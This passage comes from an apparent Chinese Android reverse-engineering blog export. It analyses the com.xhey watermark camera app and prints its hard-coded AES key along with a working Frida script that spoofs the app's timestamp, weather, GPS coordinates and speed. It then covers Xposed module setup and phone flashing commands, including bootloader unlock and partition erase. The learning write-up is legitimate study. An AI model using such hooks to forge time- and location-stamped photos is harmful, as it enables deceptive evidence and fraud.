<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> xhey.com.network.retrofit2;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">AESUtil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ENCRYPTION_IV = <span class="string">&quot;xhey-cc4275fd-43&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String ENCRYPTION_KEY = <span class="string">&quot;xhey-cc4275fd-43&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">decrypt</span><span class="params">(String arg4)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">encrypt</span><span class="params">(String arg5)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(TextUtils.isEmpty(arg5)) &#123;</span><br><span class="line">            <span class="keyword">return</span> arg5;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Cipher v0 = Cipher.getInstance(<span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>);</span><br><span class="line">            v0.init(<span class="number">1</span>, AESUtil.makeKey(), AESUtil.makeIv());</span><br><span class="line">            Log.e(<span class="string">&quot;time&quot;</span>, <span class="string">&quot;==&quot;</span> + Base64.encode(v0.doFinal(arg5.getBytes()), <span class="number">0</span>));</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> String(Base64.encode(v0.doFinal(arg5.getBytes()), <span class="number">2</span>)).trim();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception v5) &#123;</span><br><span class="line">            Log.e(<span class="string">&quot;AESUtil&quot;</span>, <span class="string">&quot;=encrypt=&quot;</span> + v5.getMessage());</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> AlgorithmParameterSpec <span class="title">makeIv</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> IvParameterSpec(<span class="string">&quot;xhey-cc4275fd-43&quot;</span>.getBytes(<span class="string">&quot;utf-8&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">static</span> SecretKeySpec <span class="title">makeKey</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> SecretKeySpec(<span class="string">&quot;xhey-cc4275fd-43&quot;</span>.getBytes(<span class="string">&quot;utf-8&quot;</span>), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此时我们就可以对Fiddler抓到的包来进行加解密了。</p>
<p><code>requestTimeInChina</code>继续查看上层引用，同样来到了<code>com.xhey.xcamera.e</code>类中</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810012605219.png" alt="image-20210810012605219"></p>
<p>同样frida分析后发现是<code>e$8</code></p>
<h3 id="分析定位">分析定位<a class="header-anchor" href="#分析定位"> ¶ </a></h3>
<p>当程序获取天气参数的时候，使用了定位</p>
<p>交叉引用向上追溯</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.xhey.xcamera.network.service.NetWorkServiceKt.requestWeatherInfo</span><br><span class="line">com.xhey.xcamera.e.b(java.lang.String[])+2Ah</span><br><span class="line">com.xhey.xcamera.e.a(boolean, com.baidu.location.BDLocation)+5D8h</span><br></pre></td></tr></table></figure>
<p>找到赋值的地方</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810013246491.png" alt="image-20210810013246491"></p>
<p>hook这两个方法就可以修改经纬度也就是定位了</p>
<p>而BDLocation是百度地图的api</p>
<p>同理速度也可以hook<code>BDLocation.getSpeed</code>来修改</p>
<h2 id="插件编写">插件编写<a class="header-anchor" href="#插件编写"> ¶ </a></h2>
<h3 id="Frida-hook脚本">Frida hook脚本<a class="header-anchor" href="#Frida-hook脚本"> ¶ </a></h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printStack</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> Exception = Java.use(<span class="string">&quot;java.lang.Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> ins = Exception.$new(<span class="string">&quot;Exception&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> straces = ins.getStackTrace();</span><br><span class="line">        <span class="keyword">if</span> (straces != <span class="literal">undefined</span> &amp;&amp; straces != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> strace = straces.toString();</span><br><span class="line">            <span class="keyword">var</span> replaceStr = strace.replace(<span class="regexp">/,/g</span>, <span class="string">&quot;\\n&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack strat=======================&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(replaceStr);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;=============================&quot;</span> + name + <span class="string">&quot; Stack end=======================\r\n&quot;</span>);</span><br><span class="line">            Exception.$dispose();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 解析 /next/android/config</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.xhey.xcamera.e$1&#x27;</span>);</span><br><span class="line">        clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">response_argu</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> response = Java.cast(response_argu, Java.use(<span class="string">&quot;xhey.com.network.model.BaseResponse&quot;</span>));</span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.code&quot;,response.code.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.data&quot;,response.data.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.msg&quot;,response.msg.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.toast_msg&quot;,response.toast_msg.value);</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.openClassFile(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).load();</span><br><span class="line">        <span class="keyword">const</span> gson = Java.use(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 解析天气 /next/GetCurrentWeather</span></span><br><span class="line"><span class="comment">         * public class WeatherInfo &#123;</span></span><br><span class="line"><span class="comment">         *      public String apparentTemperature; // 体感温度：30</span></span><br><span class="line"><span class="comment">         *      public String aqi;   // 空气质量指数：37</span></span><br><span class="line"><span class="comment">         *      public String aqiLevel; // 空气质量等级：优</span></span><br><span class="line"><span class="comment">         *      public String humidity; // 湿度：75%</span></span><br><span class="line"><span class="comment">         *      public String pressure; // 压强：1001</span></span><br><span class="line"><span class="comment">         *      public String temperature; // 温度：27</span></span><br><span class="line"><span class="comment">         *      public String weather; // 天气：晴</span></span><br><span class="line"><span class="comment">         *      public String winddirection; // 风向：西南风</span></span><br><span class="line"><span class="comment">         *      public String windpower; // 风力：1级</span></span><br><span class="line"><span class="comment">         * &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.xhey.xcamera.e$5&#x27;</span>);</span><br><span class="line">        clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">response_argu</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> response = Java.cast(response_argu, Java.use(<span class="string">&quot;xhey.com.network.model.BaseResponse&quot;</span>));</span><br><span class="line">            <span class="keyword">var</span> weather_info = Java.cast(response.data.value, Java.use(<span class="string">&quot;com.xhey.xcamera.data.model.bean.WeatherInfo&quot;</span>))</span><br><span class="line">            <span class="comment">// 对值做修改</span></span><br><span class="line">            weather_info.temperature.value = Java.use(<span class="string">&quot;java.lang.String&quot;</span>).$new(<span class="string">&quot;-99&quot;</span>);</span><br><span class="line">            <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.code&quot;, response.code.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;weather_info&quot;, gson.$new().toJson(weather_info));</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.msg&quot;, response.msg.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.toast_msg&quot;, response.toast_msg.value);</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        Java.openClassFile(<span class="string">&quot;/data/local/tmp/r0gson.dex&quot;</span>).load();</span><br><span class="line">        <span class="keyword">const</span> gson = Java.use(<span class="string">&#x27;com.r0ysue.gson.Gson&#x27;</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 解析时间 /next/inchina</span></span><br><span class="line"><span class="comment">         *      public class TimeStatus &#123;</span></span><br><span class="line"><span class="comment">         *      private boolean in_china;   // 是否在中国：true</span></span><br><span class="line"><span class="comment">         *      private boolean stopDevice; // false</span></span><br><span class="line"><span class="comment">         *      private int timestamp;      // 时间戳</span></span><br><span class="line"><span class="comment">         * &#125;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.xhey.xcamera.e$8&#x27;</span>);</span><br><span class="line">        clazz.a.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">response_argu</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> response = Java.cast(response_argu, Java.use(<span class="string">&quot;xhey.com.network.model.BaseResponse&quot;</span>));</span><br><span class="line">            <span class="keyword">var</span> time_info = Java.cast(response.data.value, Java.use(<span class="string">&quot;com.xhey.xcamera.data.model.bean.TimeStatus&quot;</span>));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// console.log(&quot;=== TIME ===&quot;)</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.code&quot;, response.code.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.data&quot;, response.data.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.msg&quot;, response.msg.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;BaseResponse.toast_msg&quot;, response.toast_msg.value);</span></span><br><span class="line">            <span class="comment">// console.log(&quot;Time&quot;, gson.$new().toJson(time_info));</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// console.log(&quot;TimeStatus.timestamp&quot;, time_info.timestamp.value);</span></span><br><span class="line"></span><br><span class="line">            time_info.timestamp.value = Java.use(<span class="string">&quot;java.lang.Integer&quot;</span>).$new(<span class="string">&quot;1912521600&quot;</span>).intValue();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = clazz.a.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;com.baidu.location.BDLocation&#x27;</span>);</span><br><span class="line">        <span class="comment">// 纬度</span></span><br><span class="line">        clazz.getLatitude.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.getLatitude.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="comment">// console.log(&quot;Latitude&quot;, result);</span></span><br><span class="line"></span><br><span class="line">            result = Java.use(<span class="string">&quot;java.lang.Double&quot;</span>).$new(<span class="string">&quot;36.269893&quot;</span>).doubleValue();</span><br><span class="line">            <span class="comment">// console.log(&quot;Change Latitude&quot;, result);</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 经度</span></span><br><span class="line">        clazz.getLongitude.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.getLongitude.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="comment">// console.log(&quot;Longitude&quot;, result);</span></span><br><span class="line"></span><br><span class="line">            result = Java.use(<span class="string">&quot;java.lang.Double&quot;</span>).$new(<span class="string">&quot;117.094738&quot;</span>).doubleValue();</span><br><span class="line">            <span class="comment">// console.log(&quot;Change Longitude&quot;, result);</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 速度</span></span><br><span class="line">        clazz.getSpeed.implementation = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">var</span> result = clazz.getSpeed.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>);</span><br><span class="line">            <span class="comment">// console.log(&quot;Speed&quot;, result);</span></span><br><span class="line"></span><br><span class="line">            result = Java.use(<span class="string">&quot;java.lang.Float&quot;</span>).$new(<span class="string">&quot;99.99&quot;</span>).floatValue();</span><br><span class="line">            <span class="comment">// console.log(&quot;Change Speed&quot;, result);</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;xhey.com.network.retrofit2.AESUtil&#x27;</span>);</span><br><span class="line">        clazz.decrypt.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = clazz.decrypt.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>)</span><br><span class="line"></span><br><span class="line">            printStack(<span class="string">&quot;AES decrypt&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;aes decrypt data:&quot;</span>, data);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;aes decrypt result: &quot;</span>, result);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = Java.use(<span class="string">&#x27;xhey.com.network.retrofit2.AESUtil&#x27;</span>);</span><br><span class="line">        clazz.encrypt.implementation = <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> result = clazz.encrypt.apply(<span class="built_in">this</span>, <span class="built_in">arguments</span>)</span><br><span class="line"></span><br><span class="line">            printStack(<span class="string">&quot;AES encrypt&quot;</span>);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;aes encrypt data:&quot;</span>, data);</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">&quot;aes encrypt result: &quot;</span>, result);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(main)</span><br></pre></td></tr></table></figure>
<h3 id="Xposed插件开发">Xposed插件开发<a class="header-anchor" href="#Xposed插件开发"> ¶ </a></h3>
<p>hook的类已经分析完了，懒得造轮子了</p>
<h2 id="效果图-2">效果图<a class="header-anchor" href="#效果图-2"> ¶ </a></h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/AndroidReverse/2021/Crack_com.xhey/image-20210810022207796.png" alt="image-20210810022207796"></p>
<h2 id="总结">总结<a class="header-anchor" href="#总结"> ¶ </a></h2>
<p>这算是自己分析的第一个app。花了差不多一天的时间，第一次接触这么大的代码量，刚开始有些懵逼。</p>
<p>但分析完发现这个app还是很简单的，没有壳也没有混淆，比较适合我这样的新手。</p>
<p>Frida啥的还是不熟练，疯狂找bug。</p>
<p>刚开始修改时间没有效果，最后发现是因为先执行了原方法<code>result = clazz.a.apply(this, arguments);</code>，导致时间在方法体内被直接应用了。</p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>小展身手</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Xposed 模块开发一 环境搭建</title>
    <url>/AndroidReverse/2021/Initial_xposed_module_development/</url>
    <content><![CDATA[<h1 id="Xposed-模块开发一-环境搭建">Xposed 模块开发一 环境搭建<a class="header-anchor" href="#Xposed-模块开发一-环境搭建"> ¶ </a></h1>
<p>参考官方文档<a href="https://github.com/rovo89/XposedBridge/wiki/Development-tutorial">Development tutorial · rovo89/XposedBridge Wiki (github.com)</a></p>
<h2 id="Xposed模块安装">Xposed模块安装<a class="header-anchor" href="#Xposed模块安装"> ¶ </a></h2>
<ol>
<li>科学下载</li>
<li>twrp 在Recovery模式下刷入</li>
<li>下载包，通过APK安装
<ol>
<li>编译[XposedInstaller_3.1.5](<a href="https://github.com/rovo89/XposedInstaller/tree/3.1.5">rovo89/XposedInstaller at 3.1.5 (github.com)</a>)或下载<a href="https://forum.xda-developers.com/attachments/xposedinstaller_3-1-5-apk.4393082/">XposedInstaller_3.1.5.apk</a>并安装</li>
<li>通过<a href="https://dl-xda.xposed.info/framework/sdk25/">https://dl-xda.xposed.info/framework/sdk25/</a>，选择设备相应架构，下载相应<code>zip</code>包</li>
<li>将下载的<code>zip包</code>放入<code>/sdcard/Android/data/de.robv.android.xposed.installer/cache/downloads/framework</code>目录</li>
<li>在APP中安装模块</li>
</ol>
</li>
</ol>
<h2 id="环境准备">环境准备<a class="header-anchor" href="#环境准备"> ¶ </a></h2>
<p>雷电模拟器 已经装好Xposed框架</p>
<h2 id="编写模块">编写模块<a class="header-anchor" href="#编写模块"> ¶ </a></h2>
<ol>
<li>
<p>新建一个空白Android项目</p>
</li>
<li>
<p>配置AndroidManifest.xml</p>
<p><code>&lt;application&gt;</code>标签下配置</p>
   <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;xposedmodule&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;xposeddescription&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;xposeddescription&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;xposedminversion&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">&quot;53&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>配置<code>build.gradle</code>文件</p>
<p>项目根目录的<code>build.gradle</code>中添加源仓库</p>
 <figure class="highlight groovy"><table><tr><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        maven &#123; url <span class="string">&#x27;https://maven.aliyun.com/repository/jcenter&#x27;</span> &#125; <span class="comment">//jcenter()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>app/build.gradle</code>中添加依赖</p>
   <figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    compileOnly &#x27;de.robv.android.xposed:api:82&#x27;</span><br><span class="line">    compileOnly &#x27;de.robv.android.xposed:api:82:sources&#x27;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注：<code>compileOnly</code>已经替代<code>provided</code></p>
</li>
<li>
<p>新建一个hook类</p>
  <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.hooktest1;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line">     </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyHook</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        XposedBridge.log(<span class="string">&quot;Loaded MMMyapp: &quot;</span> + loadPackageParam.packageName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">     </span><br></pre></td></tr></table></figure>
</li>
<li>
<p>配置<code>assets/xposed_init</code>文件<br>
在<code>app/src/main</code>下新建<code>assets</code>文件夹，内创建<code>xposed_init</code>文件<br>
内填入hook类(每行一个，不需要添加其他符号)<br>
示例</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">com.example.hooktest1.MyHook</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>生成APK<br>
Build -&gt; Build Bundle(s)/APK(s) -&gt; Build APK(s) 来生成apk</p>
</li>
<li>
<p>安装入模拟器<br>
Xposed勾选，重启模拟器</p>
</li>
<li>
<p>查看效果<br>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/.io//2021071214360574.png" alt="在这里插入图片描述"></p>
</li>
</ol>
<h2 id="此外">此外<a class="header-anchor" href="#此外"> ¶ </a></h2>
<p>API文档：<a href="https://api.xposed.info/reference/packages.html">Xposed Framework API</a></p>
]]></content>
      <categories>
        <category>Android逆向</category>
        <category>过程记录备查</category>
      </categories>
      <tags>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>Android刷机记录</title>
    <url>/AndroidReverse/2022/Android_devices_init/</url>
    <content><![CDATA[<h1 id="Android刷机">Android刷机<a class="header-anchor" href="#Android刷机"> ¶ </a></h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 命令</span></span><br><span class="line"><span class="comment"># fastboot命令</span></span><br><span class="line">fastboot reboot 重启</span><br><span class="line">fastboot flash boot 刷入boot</span><br><span class="line">fastboot flash system 刷入system镜像</span><br><span class="line">fastboot oem unlock 解锁bl</span><br><span class="line">fastboot flashing unlock 也是解锁bl</span><br><span class="line">fastboot boot <span class="string">&quot;rec镜像&quot;</span> 临时进入指定的rec</span><br><span class="line">fastboot erase <span class="string">&quot;指定分区名&quot;</span> 清除指定分区</span><br><span class="line">fastboot set_active b 或fastboot set_active a 切换AB分区</span><br><span class="line"><span class="comment"># ADB命令</span></span><br><span class="line">adb reboot 正常重启</span><br><span class="line">adb reboot recovery 重启到rec</span><br><span class="line">adb reboot bootloader 重启到BootLoader模式</span><br><span class="line">adb install <span class="string">&quot;apk安装包路径&quot;</span> 安装软件到手机</span><br><span class="line">adb shell 打开手机上的终端到电脑</span><br><span class="line">adb sideload <span class="string">&quot;刷机包路径&quot;</span> 安装电脑上的指定刷机包（rec模式下可用）</span><br><span class="line">adb connect <span class="string">&quot;IP地址:端口&quot;</span> 连接到开启了网络USB调试的设备</span><br><span class="line">adb push <span class="string">&quot;电脑上指定文件路径&quot;</span> <span class="string">&quot;手机指定目录&quot;</span> 复制电脑指定文件到手机指定目录</span><br><span class="line">adb pull <span class="string">&quot;手机指定文件路径&quot;</span> <span class="string">&quot;电脑指定目录&quot;</span> 复制手机指定文件到电脑</span><br></pre></td></tr></table></figure>
<h2 id="第一步-解锁">第一步 解锁<a class="header-anchor" href="#第一步-解锁"> ¶ </a></h2>
<h2 id="第二步-进bootloader">第二步 进bootloader<a class="header-anchor" href="#第二步-进bootloader"> ¶ </a></h2>
<ul>
<li>
<p>手机关机状态下，按电源键和音量减，直到出现写着<strong>Fastboot mode</strong>的界面</p>
</li>
<li>
<p>或者使用命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb reboot bootloader</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="第三步-电脑装入usb驱动">第三步 电脑装入usb驱动<a class="header-anchor" href="#第三步-电脑装入usb驱动"> ¶ </a></h2>
<p><a href="https://developer.android.google.cn/studio/run/oem-usb?hl=zh-cn#InstallingDriver">安装原始设备制造商 (OEM) USB 驱动程序  | Android 开发者  | Android Developers (google.cn)</a></p>
<p>win10 设备管理器，查找驱动，选择<code>android_sdk\extras\google\usb_driver\</code>查找安装</p>
<p>安装好驱动后 可以使用<code>fastboot devices</code>查找到设备，<strong>才能进行第四步</strong></p>
<h2 id="第四步-刷入Android版本镜像">第四步 刷入Android版本镜像<a class="header-anchor" href="#第四步-刷入Android版本镜像"> ¶ </a></h2>
<p>刷机镜像下载：<a href="https://developers.google.com/android/images">Factory Images for Nexus and Pixel Devices  | Google Play services</a></p>
<p>系统构建版本号：<a href="https://source.android.google.cn/setup/start/build-numbers">Codenames, Tags, and Build Numbers  | Android Open Source Project (google.cn)</a></p>
<ul>
<li>Android8.1推荐选择：OPM1.171019.011 android-8.1.0_r1</li>
<li>Android7.0推荐选择：N2G47O android-7.1.2_r8</li>
</ul>
<p>手机进入<code>bootloader</code>，解压zip镜像包，运行<code>./flash-all.sh</code></p>
<h2 id="第五步-刷入twrp与Magisk">第五步 刷入twrp与Magisk<a class="header-anchor" href="#第五步-刷入twrp与Magisk"> ¶ </a></h2>
<h3 id="pixel刷入临时twrp">pixel刷入临时twrp<a class="header-anchor" href="#pixel刷入临时twrp"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fastboot boot twrp-3.3.0-0-sailfish.img</span><br></pre></td></tr></table></figure>
<h3 id="将zip刷机包放入手机sd卡">将zip刷机包放入手机sd卡<a class="header-anchor" href="#将zip刷机包放入手机sd卡"> ¶ </a></h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb push twrp-pixel-installer-sailfish-3.3.0-0.zip /sdcard/</span><br><span class="line">adb push Magisk-v24.3.zip /sdcard/</span><br><span class="line">adb install Magisk-v24.3.apk</span><br></pre></td></tr></table></figure>
<p>新版Magisk为.apk，修改后缀名<code>.zip</code>后放入；同时安装该apk，可以免去联网下载完整版的过程。</p>
<ul>
<li>
<p>twrp下载地址：<a href="https://twrp.me/">TeamWin - TWRP</a></p>
</li>
<li>
<p>Magisk下载地址：<a href="https://github.com/topjohnwu/Magisk/releases">Releases · topjohnwu/Magisk (github.com)</a></p>
</li>
<li>
<p><a href="https://github.com/LSPosed/LSPosed/releases">Release 1.8.2 · LSPosed/LSPosed (github.com)</a></p>
</li>
</ul>
<h3 id="刷入永久twrp和Magisk">刷入永久twrp和Magisk<a class="header-anchor" href="#刷入永久twrp和Magisk"> ¶ </a></h3>
<p>点<code>Install</code>，选择相应的zip包刷入</p>
